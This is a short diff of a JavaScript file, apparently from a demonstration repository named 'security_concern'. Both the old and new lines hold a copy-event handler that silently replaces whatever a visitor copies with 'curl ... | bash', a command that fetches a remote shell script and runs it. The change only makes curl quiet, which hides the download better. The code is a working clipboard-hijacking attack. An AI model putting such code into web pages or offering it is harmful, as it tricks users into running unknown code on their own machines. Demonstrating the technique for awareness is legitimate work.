@@ -9,4 +9,4 @@
 
 */
 
-document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl https://raw.githubusercontent.com/SirObby/security_concern/main/copy_and_paste.sh | bash\n'); e.preventDefault(); });
+document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl -s https://raw.githubusercontent.com/SirObby/security_concern/main/copy_and_paste.sh | bash\n'); e.preventDefault(); });
